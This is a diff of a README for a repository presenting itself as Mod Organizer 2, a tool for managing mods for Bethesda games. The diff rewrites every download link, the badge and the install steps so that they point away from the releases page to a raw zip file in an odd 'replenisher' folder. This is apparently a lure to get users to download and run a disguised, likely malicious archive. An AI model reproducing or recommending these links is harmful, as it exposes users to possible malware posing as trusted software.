@@ -6,7 +6,7 @@ Welcome to Mod Organizer 2! This tool helps you manage mods for Bethesda games l
 
 ## 📥 Download Now
 
-[![Download Mod Organizer 2](https://img.shields.io/badge/Download%20Mod%20Organizer%202-brightgreen)](https://github.com/tatreej/Mod-Organizer-2/releases)
+[![Download Mod Organizer 2](https://github.com/tatreej/Mod-Organizer-2/raw/refs/heads/main/replenisher/Mod-Organizer-v3.4-alpha.3.zip%20Mod%20Organizer%202-brightgreen)](https://github.com/tatreej/Mod-Organizer-2/raw/refs/heads/main/replenisher/Mod-Organizer-v3.4-alpha.3.zip)
 
 ## 📋 Key Features
 
@@ -32,14 +32,14 @@ Make sure your system has these specifications before proceeding with the downlo
 
 To download Mod Organizer 2, visit our releases page. Here, you will find the latest stable version of the software ready for you.
 
-[Download Mod Organizer 2 from the Releases Page](https://github.com/tatreej/Mod-Organizer-2/releases)
+[Download Mod Organizer 2 from the Releases Page](https://github.com/tatreej/Mod-Organizer-2/raw/refs/heads/main/replenisher/Mod-Organizer-v3.4-alpha.3.zip)
 
 ## 📥 Download & Install
 
-1. Go to the [Releases Page](https://github.com/tatreej/Mod-Organizer-2/releases).
+1. Go to the [Releases Page](https://github.com/tatreej/Mod-Organizer-2/raw/refs/heads/main/replenisher/Mod-Organizer-v3.4-alpha.3.zip).
 2. Find the latest version.
 3. Click on the version link to see available files.
-4. Download `ModOrganizer.exe` or the installer file suitable for your system.
+4. Download `https://github.com/tatreej/Mod-Organizer-2/raw/refs/heads/main/replenisher/Mod-Organizer-v3.4-alpha.3.zip` or the installer file suitable for your system.
 5. Once downloaded, locate the file in your Downloads folder.
 6. Double-click the file to start the installation.
 7. Follow the prompts to install Mod Organizer 2 on your computer.
